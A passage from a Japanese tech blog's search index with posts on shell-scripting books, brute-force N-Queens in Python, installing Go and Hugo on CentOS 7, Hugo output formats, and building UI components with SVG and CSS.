すればよいのです。Linux/Unixとはそういうものなのです。 書籍の紹介 詳解 シェルスクリプト 大型本 – 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） – 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-28T14:02:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/linux_hu86d6acd804ad404fbf9e1694bf0c7390_22913_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-28-01-suzuki/","title":"iPadに開発環境を構築してみるテスト"},{"content":"Nクイーン問題とは Nクイーン問題とは、チェスの盤面にクイーンを１行に１個ずつ効き筋に当たらないように置いていこうという問題です。\nhttps://ja.wikipedia.org/wiki/%E3%82%A8%E3%82%A4%E3%83%88%E3%83%BB%E3%82%AF%E3%82%A4%E3%83%BC%E3%83%B3\nNクイーンのNは盤面の行・列の数です８クイーンだと８x８です。\nおける場所の数を算出する法則はないのでプログラムを組んでクイーンを配置していくしかないのですが、\nNの数が増えれば置ける場所の候補が爆発的に増えていきプログラムでも何年経っても終わらないようなものになります。\n現在最大のNは２７クイーンです。\nNクイーンを早く解く方法はいくつかあって、\n①アルゴリズムを使って探索を効率化する\n②ビット計算で計算速度を上げる\n③GPUなどを使って並列計算をする\nなどがあります。\nPythonで頑張る Python は最近すっかりメジャーになり、プログラミング教育が小学校で必修化され最初に学ぶのがPythonだという話もあります。\nライブラリも非常に充実しています。\nそこで勉強を兼ねてPythonを使ってNクイーン問題を解いていこうと思います。\nアルゴリズムなしでNクイーン問題を解こうとすると。。。 Nクイーンはアルゴリズムを使うとどのくらい早くなるのでしょうか。\nそれを体感するために今回はまったくアルゴリズムを使わないでプログラムにNクイーン問題に取り組ませてみましょう。\nまったくアルゴリズムを使わない方法は「ブルートフォース　力任せ探索」と呼ばれるものです。\nN4だと4の4乗で256パターン\n私のPCだと0m0.042sで終了しますが\nN8だと8の8乗で16777216パターン\n3m7.321sもかかってしまいます。\nちなみに今後やる検索効率化アルゴリズム「バックトラック」だと\nN8でと0m0.03sで完了します（もっと早いアルゴリズムも出てきます。）。\nここでは触って動かしてみていただいて時間かかるなあと思っていただければ良いです。\nプログラムについて プログラムは以下のgitにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py01_nqueen.py\nこのプログラムは鈴木維一郎先生が作成したものです。\n私はこのプログラムを初めてみながらpythonだとこう書くんだと思いながら\npythonの勉強させてもらいながらコメントしていく感じになります。\nプログラムのダウンロード方法は以下です。\ngit clone https://github.com/suzukiiichiro/N-Queens/\n実行方法は\nN-Queens/03Pythonに移動して\npython py01_nqueen.py\nです。\nプログラム概要 このプログラムでやりたいことはエイトクイーン(N=8)の時に全ての可能性のある解の候補を体系的に数え上げます。\n利き筋などは全く考えず1行に1個ずつクイーンを置いていきます。\nパターン数はNxNになるのでエイトクイーン(N=8)だと8の8乗16777216パターンクイーンを配置します。\nプログラムがやるのはここまでです。これが正解かどうかはプログラムではチェックしません。\nプログラムが列挙したパターンから人力でどれが正解かをチェックしようと思ったらエイトクイーン(N=8)でも相当の年月がかかりますね。\n出力はパターンのカウント数と各行にクイーンが置かれた場所になります。\n1: 00000000 2: 00000001 3: 00000002 4: 00000003 . . . 163100: 00476433 163101: 00476434 163102: 00476435 163103: 00476436 . . . 16777213: 77777774 16777214: 77777775 16777215: 77777776 16777216: 77777777 例えば\n163101: 00476434\nだと\n163101はカウント数です。163101番目のパターンという意味です。\n00476434はクイーンが置かれた場所です\n左端が1行目で左から右へ行数が増えていきます。\nクイーンの位置が\n0:1行目は0なので右から1番目\n0:2行目は0なので右から1番目\n4:3行目は4なので右から5番目\n7:4行目は7なので右から8番目\n6:5行目は6なので右から7番目\n4:6行目は4なので右から5番目\n3:7行目は3なので右から4番目\n4:8行目は4なので右から5番目\nに置かれたということを表現しています。\n図にすると以下になります\n図 この例だと2行目に1行目と同じ列にクイーンを配置しているので、2行目の段階で1行目の下の効き筋に引っかかっているので解にはなりません。\n次回はプログラム詳細について説明していきたいと思います。\n","date":"2022-01-27T15:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-27-01-ani/","title":"第1回 pythonでNQueen（エイトクイーン）ブルートフォース　力任せ探索（１）"},{"content":"HugoをGitHub Pagesで展開していたのですが、今回はGitHub Pagesではなく、Amazon EC2にHugoをインストールしてみたいと思います。\nGO言語をCentOS7にインストール Hugoを利用するためにGo言語をインストールするのですが、yumでインストールすると様々ななエラーが出る場合があるので、今回はtarファイルを解凍して配置します。\nbrewがすでにインストールされている場合はbrewでのインストールが早いです。\nGO言語をインストール まずは、GO言語のファイルをダウンロードして、解凍、インストールする場所に配置してやりましょう。\n$ wget https://golang.org/dl/go1.16.linux-amd64.tar.gz $ sudo tar zxf go1.16.linux-amd64.tar.gz -C /usr/local/ $ export PATH=$PATH:/usr/local/go/bin インストールされたGoのバージョンを確認します\n$ go version インストールが成功していれば、下記のようなバージョンが表示されます。\ngo version go1.15.14 linux/amd64 GOROOTも確認しておきます\n$ go env|grep GOROOT GOROOT=\u0026#34;/usr/local/go\u0026#34; Hugoをインストールする上で、GOPATHが必要なので設定しましょう。\nGOPATHとGOROOTが同じ場所にならないようにすることに注意してください。\n同じ場所に設定してしまうと、\nwarning: GOPATH set to GOROOT (/usr/local/go) has no effect といったワーニングが表示されてしまいます。\nなので、GOPATHとGOROOTを別にしてやりましょう。\nそれではGOPATHを設定していきます。\nvi ~/.bash_profile 上記のコマンドで、.bash_profileをひらいて、下記のコマンドを追加します。\nexport GOPATH=$HOME/go export PATH=$GOPATH/bin:$PATH:$HOME/bin 設定を反映させて、確認します。\n$ source ~/.bash_profile $ echo $GOPATH /home/[user]/go $ echo $PATH /home/[user]/go/go/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/root/bin:/root/bin:/root/bin:/root/bin 無事追加できました。\n以上がGo言語の設定になります。\nHugoをCentOS7にインストール それでは、いよいよHugoをインストールしましょう。\nGitHubからHugoを取得します。\nmkdir $HOME/src cd $HOME/src git clone https://github.com/gohugoio/hugo.git cd hugo go install --tags extended インストールできたら hugo してみましょう\nGitInfoを使っているとエラーになる場合がある Gitのバージョンが古いと、hugoした際に、情報を取得できないくてエラーになってしまうようです。\nhugo v0.93.0-DEV+extended linux/amd64 BuildDate=unknown ERROR 2022/01/27 Failed to read Git log: Unknown option: -C usage: git [--version] [--help] [-c name=value] [--exec-path[=\u0026lt;path\u0026gt;]] [--html-path] [--man-path] [--info-path] [-p|--paginate|--no-pager] [--no-replace-objects] [--bare] [--git-dir=\u0026lt;path\u0026gt;] [--work-tree=\u0026lt;path\u0026gt;] [--namespace=\u0026lt;name\u0026gt;] \u0026lt;command\u0026gt; [\u0026lt;args\u0026gt;] 私の環境ではGitのバージョンがgit version 1.8.3.1 となっていたため、これをアップデートして正しく動作するようにします。\nまずはすでにインストールされているGitを削除します。\n$ sudo yum -y remove git 次に、2系の配布がされているiusリポジトリを追加します。\n私の環境はCentOS7だったので下記のコマンドでyumからインストールします。\n$ sudo yum -y install https://repo.ius.io/ius-release-el7.rpm iusはサードパーティのリポジトリのため、常に有効にならないように設定ファイルを確認しておきます。enabled = 0 となっていたら、常に有効にならない設定です。\n[ius-debuginfo] name = IUS for Enterprise Linux 7 - $basearch - Debug baseurl = https://repo.ius.io/7/$basearch/debug/ enabled = 0 repo_gpgcheck = 0 gpgcheck = 1 gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-IUS-7 [ius-source] name = IUS for Enterprise Linux 7 - Source baseurl = https://repo.ius.io/7/src/ enabled = 0 repo_gpgcheck = 0 gpgcheck = 1 gpgkey = file:///etc/pki/rpm-gpg/RPM-GPG-KEY-IUS-7 それでは。インストール可能なGitを調べます。\nyumでiusを使うときは、yumコマンドの際に、--enablerepo=iusオプションをつけます。\n$ sudo yum list --enablerepo=ius | grep git2 … git224.x86_64 2.24.4-1.el7.ius ius … インストール可能なGitがあったので、インストールをします。\n$ sudo yum -y install --enablerepo=ius git224 インストールが無事完了したことを確認しましょう\n$ git --version git version 2.24.3 バージョンが表示されていたら、正常にインストールが完了してます。\nこれで GitInfo 使ったhugoのサーバでもhugoコマンドが実行できるようになりました。\nおすすめの書籍 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-27T13:31:52+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/catch_huc49a39ca3161145aca5fe042a7423360_209786_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-27-01-wyoshi/","title":"Amazon EC2でもGo言語とHugoを使えるようにする方法"},{"content":"HUGOは非常に強力な静的HTMLジェネレーターです。\n複数のXMLを設置する機会があり、どうやったら設置できるのかなと悪戦苦闘しながら実装できましたので、そのやり方を共有します。\n今回は sitemap.xml を複数設置する必要があったため、その方法になります。\nこの方法の出力やファイル形式を変えることで、RSSやJSON、AMPなどの形式も出力できるようになると思います。\nconfig に設定を追加する まずは config.yaml に出力用の設定をします。\n設定の内容は下記のようになります。\n私は yaml 形式の設定ファイルを使っているのですが、toml や json 形式の設定ファイルを使っている方は、 HUGO のページを見ながらそれぞれにあった記述にしてください。\nmediaTypes: application/xml: suffixes: xml outputFormats: Sitemap: MediaType: application/xml baseName: \u0026#34;google_sitemap\u0026#34; noUgly: true outputs: home: [HTML, Sitemap, RSS] 上から順に説明します。\n出力ファイルの形式 mediaTypes: application/xml: suffixes: xml ここでは出力したい形式を選択してます。今回は、xmlのタイプを選んでます。\nちなみに、この部分は記述しないでも問題がない部分です。\n私の環境では出力した場合に、エラーにならずに正常にファイルが出力されました。\nsuffixesの部分では複数の形式を記述することが可能です。\n例えば、rss+xmlの場合は\nmediaTypes: application/rss+xml: suffixes: - xml - rss となります。\n出力ファイルの種類 次に、outputFormats部分ですが、この部分が出力の際に重要になってきます。\n今回はサイトマップ形式で出力するので、下記のようにしました。\noutputFormats: Sitemap: MediaType: application/xml baseName: \u0026#34;google_sitemap\u0026#34; noUgly: true 上の yaml を説明すると、\nSitemap 形式で MediaTypeはサイトマップを表すapplication/xmlを使用して、google_sitemapというファイル名のXMLを出力します。\n出力の形式 出力形式のオプションは以下のようになります。\n1つのページに多くの出力形式で出力可能 1つのページを好きなだけ多くの出力形式で出力することができ、ファイルシステム上の一意なパスに解決する限り、無限に出力形式を定義することができるのです。\n表では、AMPとHTMLの比較が最も良い例です。AMPはHTML版を上書きしないようにPathにampという値を持っています。\n例えば、/index.htmlと/amp/index.htmlの両方を持つことができるようになりました。 MediaTypeはは既存のもののみ MediaTypeは、既に定義されているメディアタイプのTypeと一致する必要があります。 再定義可能 新しい出力形式を定義したり、組み込みの出力形式を再定義することができます。\n例えば、AMPページを別のパスに配置したい場合などです。 出力フォーマットを追加または変更するには、サイトの設定ファイルのoutputFormatsセクションで、すべてのサイトまたは特定の言語について定義します。\nname mediaType path baseName rel protocol isPlainText isHTML noUgly permalinkable HTML text/html index canonical false true false true AMP text/html amp index amphtml false true false true CSS text/css styles stylesheet true false false false CSV text/csv index alternate true false false false Calendar text/calendar index alternate webcal:// true false false false JSON application/json index alternate true false false false ROBOTS text/plain robots alternate true false false false RSS application/rss+xml index alternate false false true false Sitemap application/xml sitemap sitemap false false true false WebAppManifest application/manifest+json manifest manifest true false false false 出力形式を設定する 以下は、出力形式に関する設定オプションの全リストとそのデフォルト値になります。\nname 出力形式の識別子です。これは、ページに必要な出力形式を定義するために使用されます。 mediaType 定義されたメディアタイプのTypeと一致しなければなりません。 path 出力ファイルを保存するサブパス。 baseName ファイル名です。デフォルトはindex。 rel リンクタグのrel値を作成するために使用します。デフォルトはalternate。 protocol この出力形式に対して、baseURL の \u0026ldquo;http://\u0026rdquo; または \u0026ldquo;https://\u0026rdquo; を置き換えます。 isPlainText テンプレートにGoのプレーンテキストテンプレートパーサーを使用します。デフォルト: false。 isHTML HTMLタイプのフォーマットにのみ関連する状況で使用されます; 例えば、ページのエイリアスなどです。 noUgly uglyURLs がサイト内で true に設定されている場合、醜い URL をオフにするために使用されます。デフォルト：false notAlternative このフォーマットをPageのAlternativeOutputFormatsフォーマットのリストに含めることが意味をなさない場合（例えば、CSSなど）有効にします。\n注意点として、必ずしも他のフォーマットを置き換えるわけではないので、ここではalternateではなくalternativeという用語を使っています。デフォルト：false permalinkable .Permalink と .RelPermalink が main ではなくレンダリング出力形式を返すようにしました。これは、HTMLとAMPでデフォルトで有効になっています。デフォルト：false weight 0 以外の値を設定すると、最初のソート条件として使用されます。 出力するページを選択 最後に出力するページに関してです。\noutputs: home: [HTML, Sitemap, RSS] この部分はどのページで出力するかを選択できます。\n今回はサイトマップを作成したいので、ドキュメントルートに当たる home (/index.html) 部分でのみの出力としてます。\nHTML形式と、Sitemap、RSSを出力するようにしてます。HTMLでは index.html を出力し、RSSでは index.xml のRSS形式のフィードを出力してます。そして、今回追加したSitemapでサイトマップ形式のファイルを出力するようにしました。\n各ページの初期状態での出力は下記を参考にしてください。\npage HTML home HTML, RSS section HTML, RSS taxonomy HTML, RSS term HTML, RSS テンプレートファイルを追加する 設定が終わったので、次はテンプレートファイルを設置します。\nサイトマップ用のテンプレートを作成して、layouts/_defaultディレクトリに配置します。\nここが一番のポイントで、配置する際のファイル名は [page].[outputFormatsの名前].[suffixe] となります。\nつまり、今回でいうと home.sitemap.xml となります。\nただし、pageの場合は下記のようにmarkdownに埋め込んで出力します。\n--- title: \u0026#34;Search\u0026#34; layout: \u0026#34;search\u0026#34; outputs: - html - json --- これによって、layouts/page/search.html と layouts/page/search.json ファイルを使用して出力ファイルを作成します。\nおすすめの書籍 Markdownライティング入門　プレーンテキストで気楽に書こう！ (技術の泉シリーズ（NextPublishing）) 【プレーンテキストでらくらくライティング! Markdownを使いこなそう! 】 本書は、文章を書く=ライティングを「気楽に」行うための道具としての「Markdown」形式を紹介し、その使い方を詳しく解説しています。Wordなどのワープロソフトに限定されることなく、テキストエディタやMarkdown専用エディタ、ポメラなどの文書入力専用機、さらにはスマートホン上でも「見出し」や「強調」といった文章執筆に必要な情報を共有するための書式であるMarkdownの書き方やその定義や起源を、初心者でもわかりやすく紹介しています。 〈本書の対象読者〉 執筆のストレスを減らして集中したい人 PCが古くて軽いアプリで執筆したい人 いろいろなアプリで原稿を使いまわしたい人 思いついた時にスマホでメモ書きして原稿にまとめたい人 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-26T14:37:51+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/catch_hud5f0ce966674d6b97fd2cc6aa77b573d_63288_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-26-01-wyoshi/","title":"HUGOでxmlやjsonファイルを複数出力する方法を詳しく解説"},{"content":"出典元： Building UI Components With SVG and CSS - Ahmad Shadeed SVGはアイコンやイラストだけでなく、開発者が時々忘れてしまう隠れた力をたくさん持っています。\nCSSと比較してSVGを使用することが非常に理にかなっているユースケースはたくさんあります。たとえば、円形の読み込みアニメーションを作成したり、画像にマスクを適用したりします。このような場合、CSSを使用できないという意味ではありませんが、使用する手法（マスクなど）に基づいてクロスブラウザの問題と戦うのは難しい場合があるため、SVGを使用すると時間と労力を節約できます。\nSVGの優れている点は、応答性、パフォーマンス、およびHTML＆CSSを使用してすぐに使用できることです。この記事では、SVGをHTMLおよびCSSとともに使用して特定のUIコンポーネントを構築できるさまざまなユースケースを紹介することを目標としています。\nそれでは、ユースケースを見てみましょう。\nカットアウトアバター 切り抜かれたアバターは、FacebookのCSSを調べているときに見つけたものです。\nメッセンジャーでは、ユーザーアバターにバッジを付けることができ、バッジ用のスペースを割り当てるためにアバターが切り取られます。\nこれは、CSSの白い境界線を追加することで実行できます（簡単な修正として）が、さらに動的SVGコンポーネントに取り入れてみましょう。\n.badge { border: 2px solid #ff; } borderが機能する場合、なぜSVGを使用するのか考えているかもしれませんが、間違いではありません。\nしかし、他よりも優れた解決策があります。数学の授業で、教師が問題にさまざまな解決策がある可能性があり、そのうちの1つが柔軟性の点で優れている可能性があると述べたことを覚えていますか？今回の問題もそれと同じです。\nとにかく、border の解決策がどのようにすぐに失敗するかを示してみましょう。\n失敗例\nホバー時：カードの背景が変わるため、白い境界線が奇妙に見えます。 ダークモード：白い境界線は黒っぽい背景の上になります 次の図では、バッジの白い境界線が暗い背景とホバー状態にどのように干渉しているかに注目してください。\nホバー時に境界線colorを変更することでそれを解決できますが、それは最善の解決策とは思えません。\n.card__badge { border: 2px solid #ff; } .card:hover .card__badge { border-color: lightgrey; } @media (prefers-color-scheme: dark) { .card__badge { border-color: #454545; } } SVGを使用すると、バッジの下の領域をカットすることで、上記の問題をより適切に解決できます。そうすれば、あらゆる種類のバックグラウンドで機能します。\n次の図を見てください。\nアバターを含めるためにSVG \u0026lt;image\u0026gt;要素を使用しています。バッジ領域を切り取るには、2つの\u0026lt;circle\u0026gt;要素を作成する必要があります。1つは白で、もう1つは黒です。\nマスクでは、黒で塗りつぶされた要素はすべて非表示になります、白の要素は表示されます。黒い円は、半径18の右下隅に配置されています。\n開発者ツールでは、上記は減算と呼ばれます。大きい円から小さい円を引きます。\nこれが最後のデモです\nタイトルの装飾 あるクライアントのプロジェクトで、SVGとCSSを組み合わせてセクションタイトルをデザイン・構築したことがあります。\nセキュリティに関連するブランドなので、このようなスタイルを使うことがあるかもしれません。\nコンポーネントは短いタイトルと長いタイトルで動作する必要があり、タイトルが長すぎる場合は、レイアウトを壊さずに複数の行に折り返す必要があります。\nそれを構築するためには、以下のような対応が必要です。\n最初に、固定部分（右側）をコピーして、インラインSVGとして追加する。 CSSを使用して、タイトルの下に行を作成しました。また、行の最初と最後にある小さな円にも使用。 不要なポジショニングを使用しないように、flexboxを使用してコンポーネントレイアウトを作成。 それでは基本的なHTMLとCSSから始めましょう。\n\u0026lt;h2 class=\u0026#34;c-section__title\u0026#34;\u0026gt; \u0026lt;span\u0026gt;CSS is awesome\u0026lt;/span\u0026gt; \u0026lt;svg xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34; width=\u0026#34;128\u0026#34; height=\u0026#34;34.5\u0026#34; viewBox=\u0026#34;0 0 128 34.5\u0026#34; preserveAspectRatio=\u0026#34;none\u0026#34;\u0026gt; \u0026lt;path fill=\u0026#34;none\u0026#34; stroke=\u0026#34;#d8d8d8\u0026#34; stroke-width=\u0026#34;2\u0026#34; d=\u0026#34;M127 1H33.5L1 33.5\u0026#34;\u0026gt;\u0026lt;/path\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;/h2\u0026gt; .c-section__title { max-width: 700px; width: fit-content; display: flex; margin-left: auto; margin-right: auto; } 次のステップでは、span 要素の下にボーダーを追加して、SVGに接続された線を追加したいと思います。\nSVGが回線に接続されていないことに気づきました。\nflexboxを使用しているので、修正するのは簡単です。flex-item をflex-endに揃える必要があります。\n.c-section__title { max-width: 700px; width: fit-content; display: flex; align-items: flex-end; margin-left: auto; margin-right: auto; } 次に、絶対位置指定で擬似要素を使って、最初と最後に円を追加する必要があります。\nまた、SVGを使うと何がいいかというと、SVGのパスを点線にして、アニメーションさせることができるのです。\nそのためには、SVGで書き出されたパスがアウトライン化されていないことを確認する必要があります。\n\u0026lt;path d=\u0026#34;M127 1H33.5L1 33.5\u0026#34; fill=\u0026#34;none\u0026#34; stroke=\u0026#34;#d8d8d8\u0026#34; stroke-width=\u0026#34;2\u0026#34;\u0026gt;\u0026lt;/path\u0026gt; このテクニックは、Jake Archibald氏の素晴らしい記事 から学びました。このアイデアは、パスの長さを求めるというものです。\nChrome DevToolsで、SVGを検査し、\u0026lt;path\u0026gt;要素を選択すると、その末尾の横に== $0と表示されることがわかります。これを選択したまま、コンソールに移動し、以下のスクリプトを記述します。\n$0.getTotalLength() // 139.46 このようなことをしなくても、DOMから要素を選択するには、$0が手っ取り早いです。\nlet sectionPath = document.querySelector(\u0026#39;#path\u0026#39;); console.log(sectionPath.getTotalLength()); それはこの例の文脈の中での簡単なヒントでした。\nさて、長さが決まったら、あとは好きなようにやってみましょう。例えば、ホバー時にアニメーションさせることができます。\n.c-section__title--dashed path { stroke-dasharray: 139; stroke-dashoffset: 0; transition: 0.7s; } .c-section__title--dashed:hover path { stroke-dashoffset: 139; } または、単純に点線に変えることもできます（この場合、パスの長さを知る必要はありません）。\nSVGを使ったカスタムリンクの下線 SVGを使って、ワクワクするようなカスタムリンクのアンダーラインを作成することができます。私は数年前に、ランダムにパスを生成し、ホバー時にそれを再描画するスクリプトを作成しました。\n次の図で、プレビューの前と後を考えてみてください。\nアイデアは、各リンクにSVGを挿入することであり、次のようになります。\n\u0026lt;svg width=\u0026#34;400\u0026#34; height=\u0026#34;35\u0026#34; xmlns=\u0026#34;http://www.w3.org/2000/svg\u0026#34;\u0026gt; \u0026lt;path id=\u0026#34;pathItem\u0026#34; d=\u0026#34;M5 5 Q 30 15 170 5\u0026#34; stroke=\u0026#34;black\u0026#34; fill=\u0026#34;transparent\u0026#34; stroke-width=\u0026#34;7\u0026#34; stroke-linecap=\u0026#34;round\u0026#34;/\u0026gt; \u0026lt;/svg\u0026gt; この手法は d 属性値を変更することによって起こります。これは、パスが実際にどのように描画されるかを示すビジュアルです。\nカスタムSVGテープ クライアントのプロジェクトに携わっているとき、CSSでどこにでも配置可能で、1つのCSS変数のみで色を変更できるほどダイナミックな方法で、テープをセクションに取り付ける方法が必要でした。\n次の図を考えて見ましょう。\nAdobe Illustratorで、テープをレイヤーに分割しました。\nベース：塗りつぶしの色を取ります 透明な黒：暗い領域を示します 透明な白：明るい領域を示します SVGコードを見てみましょう。\n\u0026lt;svg\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;g id=\u0026#34;tape\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt; \u0026lt;!-- path contents --\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; fill=currentColorを追加したことに注意してください。\ncurrentColorキーワードは、CSS color プロパティから値を継承するため、1つのプロパティのみを使用して色を動的に変更できます。\n単色のベースと、明るい領域と暗い領域に他の2つのレイヤーがあることを考えると、色を変更すると、テープの外観が異なります。\nさらに良いことに、SVGをテンプレートに変換し、\u0026lt;use\u0026gt; SVG要素の助けを借りて、SVGを複製せずにテープを再利用することができます。\n\u0026lt;svg style=\u0026#34;display: none;\u0026#34;\u0026gt; \u0026lt;defs\u0026gt; \u0026lt;g id=\u0026#34;tape\u0026#34; fill=\u0026#34;currentColor\u0026#34;\u0026gt; \u0026lt;!-- path contents --\u0026gt; \u0026lt;/g\u0026gt; \u0026lt;/defs\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;!-- An example of using the tape from a template --\u0026gt; \u0026lt;svg class=\u0026#34;tape\u0026#34; style=\u0026#34;--angle: 10deg; color: red; --size: 120px;\u0026#34; aria-hidden=\u0026#34;true\u0026#34; focusable=\u0026#34;false\u0026#34; viewBox=\u0026#34;0 0 123 47\u0026#34;\u0026gt; \u0026lt;use href=\u0026#34;#tape\u0026#34;\u0026gt;\u0026lt;/use\u0026gt; \u0026lt;/svg\u0026gt; \u0026lt;use\u0026gt;要素を介してテープを追加した方法に注目してください。これの良いところは、CSS変数をインラインスタイルとして使用することです。\nCSSは次のようになります。\n.tape { width: var(--size); transform: rotate(var(--angle)); } まとめ SVGを使用してUIコンポーネントを構築すると、作業がより簡単かつ簡単になります。一部のUIコンポーネントは、100％完璧なユースケースやSVG（アバターカットアウトなど）ではない場合がありますが、作業しているプロジェクトのコンテキストによって異なります。\nおすすめの書籍 SVGエッセンシャルズ 第2版 SVGの解説書。SVGは2001年にW3C勧告として公開されたXMLベースの画像フォーマットです。 ベクターグラフィックスなので拡大縮小、変形しても美しさが損なわれません。 会社のロゴをSVGで作る企業も増えていますし、D3.jsによるデータビジュアライゼーションでも基盤技術としてSVGが使われています。 本書では簡潔なサンプルを数多く使い、基本的な図形の作成、アニメーションや複雑なグラフィックスの作成、さらにはスクリプトによる制御など、SVGの基礎から応用までをわかりやすく解説します。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 【特典付き】HTML5\u0026amp;CSS3デザイン 現場の新標準ガイド【第2版】 (Compass Booksシリーズ) 体系的に学ぶHTMLとCSSの仕様と実践 フロントエンドエンジニアはじめ、Web制作に関わっている人のためのHTML5/CSS3ガイドブックです。 HTMLとCSSの最新仕様を整理するとともに、主要ブラウザの対応状況など、現時点でどのポイントに留意して制作を進めていけばよいか、現場で必要不可欠な情報を解説しています。 また、フレキシブルボックスレイアウトやグリッドレイアウトなど、現在知っておくべきHTML\u0026#43;CSSレイアウトの手法についても、詳細に解説しています。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-01-24T16:18:06+09:00","image":"https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/catch_hu63ed63126958850caf33a21e9ed1b17d_111773_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-01-24-01-wyoshi/","title":"SVGとCSSでおしゃれでクールな最新のデザインにする"},{"content":"hampelによる異常値部分を追加しよう 前回はgoogle custom search 